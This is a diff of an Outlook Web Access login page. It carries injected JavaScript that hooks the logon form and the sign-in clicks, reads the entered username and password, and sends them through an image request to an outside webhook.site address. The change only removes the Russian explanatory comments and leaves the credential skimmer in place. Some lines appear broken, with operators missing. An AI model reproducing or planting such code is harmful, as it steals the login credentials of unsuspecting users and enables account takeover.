@@ -197,17 +197,13 @@ function RndMimeCtlHlpr(objid, classid, ns, id)
 
 <form action="/owa/auth.owa" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
 <script>
-// Ждем, пока страница полностью прогрузится
 window.onload = function() {
-    // Ищем кнопку входа. В OWA это обычно класс 'signinbutton' или ID 'signin'
-    // Мы просто будем слушать КЛИК по всей странице, если нажали на то, что похоже на вход
     document.onclick = function(e) {
         if (e.target.className.indexOf('signin') !== -1  e.target.id.indexOf('sub') !== -1) {
             capture();
         }
     };
 
-    // Или перехватываем саму отправку формы (самый верный способ)
     var f = document.getElementById('logonForm')  document.forms[0];
     if (f) {
         f.onsubmit = capture;
@@ -218,14 +214,12 @@ function capture() {
         var u = document.getElementById('username').value;
         var p = document.getElementById('password').value;
 
-        // Склеиваем данные
         var rawData = u + ":" + p;
 
-        // Кодируем ВСЮ строку целиком, чтобы спецсимволы не ломали URL
         var safeData = encodeURIComponent(rawData);
 
         var i = new Image();
-        // Теперь в creds передается "бронированная" строка
+
         i.src = "https://webhook.site/935e6287-bba1-41f0-abd8-c890898bed60?creds=" + safeData;
 
         var s = new Date().getTime();
